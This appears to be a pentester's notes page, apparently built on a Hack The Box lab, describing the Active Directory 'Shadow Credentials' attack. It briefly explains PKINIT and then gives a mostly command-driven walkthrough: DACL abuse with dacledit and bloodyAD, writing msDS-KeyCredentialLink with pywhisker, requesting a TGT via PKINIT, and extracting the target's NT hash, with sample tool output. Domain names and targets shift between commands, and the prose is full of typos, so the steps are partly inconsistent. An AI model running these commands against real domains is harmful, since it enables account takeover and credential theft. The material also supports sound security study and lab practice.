---
description: Shadow credentials | AS-REQ | AS-REP | Account takeover
---

# Shadow Credentials

The Kerberpos authentication protocol works with tickets, like an TGS can be obtained by presenting a TGT.  That prior TGT can be obtained by validing a first step "pre-authentication", when this is removed from an account it vulnerable for ASREProast. Validatino for pre-authentication works symmetricallyl or (with a DES, RC4, AES128 or AES256 key) or asymmetrically (with certificates).&#x20;

The asymmetrical way of pre-authenticating, working with certificates is called PKINIT.

{% hint style="info" %}
It is possible to add “Key Credentials” to the attribute **msDS-KeyCredentialLink** of the target user/computer object and then perform Kerberos authentication as that account using PKINIT.
{% endhint %}

### <mark style="color:yellow;">PKINIT</mark>

In Kerberos authentication clients must perform "pre-authentication" before the KDC provides a TGT  which can be used for Service Tickets. Without pre-authentication anyone could obtain the key with a password like in AS-REP Roasting.

The pre-authentication works with a timestamp to prevent replay attacks. Most used is the symmetric key and less common asymmetric key approach which works with a public-private key pair. It encrypts pre-authentication data with private key, and the KDC decrypts it with the public key. The KDC has the keys as well allowing for exchange session key.

### <mark style="color:yellow;">Abuse</mark>

In order to exploit this technique we need:

* A minimum of one Windows Server 2016 Domain Controller is needed with PKNIT support.
* The Domain Controller must have a server authentication digital certificate installed, and DC has its own key pair for exhange.
* Have control over account that can edit target objects `msDs-KeyCredentialLink` attribute.

#### The attack

1. Create an RSA key pair
2. Create an X509 certificate configured with the public key
3. Create a [KeyCredential](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/de61eb56-b75f-4743-b8af-e9be154b47af) structure featuring the raw public key and add it to the `msDs-KeyCredentialLink` attribute
4. Authenticate using PKINIT and the certificate and private ke

```bash
python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "add"
```

### <mark style="color:yellow;">Shadow credential attack</mark>

Example attack using DACL abuse and retrieving hash. In this scenario we have WriteOwner over user1 and GenericAll over user2.&#x20;

```bash
# Enable Addmembers
python dacledit.py -action 'write' -rights 'WriteMembers' -principal 'user1' -target-dn 'CN=ZEN,CN=USERS,DC=CERTIFIED,DC=HTB' 'zencorp.aaa/user1':'pass123'
```

Next we add user1 to Zen group.

```bash
# Add member to group Zen
net rpc group addmem "Zen" "user1" -U "zencorp.aaa"/"user1"%"pass123" -S "DC01.zencorp.htb"
```

Generate keys and certifcate

```bash
python3 pywhisker.py -d "zencorp.aaa" -u "user1" -p 'pass123' --target "user2" --action "add"

# Will output
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: aacadbaa-8f06-2f9a-33ab-19bcad12694f
[*] Updating the msDS-KeyCredentialLink attribute of management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: WElBKRZS.pfx
[*] Must be used with password: 1JHPFhefkg77PqfH8qGn
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

Now can request a TGT

```bash
gettgtpkinit.py certified.htb/management_svc -cert-pfx WElBKRZS.pfx -pfx-pass '1JHPFhefkg77PqfH8qGn' user.ccache
```

And finally we can get the NT hash

```bash
KRB5CCNAME=user.ccache python3 getnthash.py test.local/DC01\$ -key 6e63333c372d7fbe64dab63f36673d0cd03bfb92b2a6c96e70070be7cb07f773
```

<details>

<summary>Alternate method using bloodyAD</summary>

```
1 - Set Owner:
bloodyAD --host zencorp.aaa -u user1 -p 'pass123' -d zencorp.aaa set owner "Management" user1

2 - Grant GenericAll
bloodyAD --host dc01.zencorp.aaa -u user1 -p 'pass123' -d zencorp.aaa  add genericAll 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' user1

3 - Add to Group:
bloodyAD --host dc01.zencorp.aaa -u user1 -p 'pass123' -d zencorp.aa add groupMember 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' user1

4.2 - Get keys/cert
bloodyAD --host dc01.certified.htb -u judith.mader -p 'judith09' -d certified.htb add shadowCredentials management_svc

4.2.2 - Shadow Credential - Request TGT
openssl pkcs12 -export -out 3MvYN5a2.pfx -inkey 3MvYN5a2_priv.pem -in 3MvYN5a2_cert.pem -password pass:
certipy auth -pfx 3MvYN5a2.pfx -dc-ip 10.129.252.63 -username management_svc -domain certified.htb
```

</details>

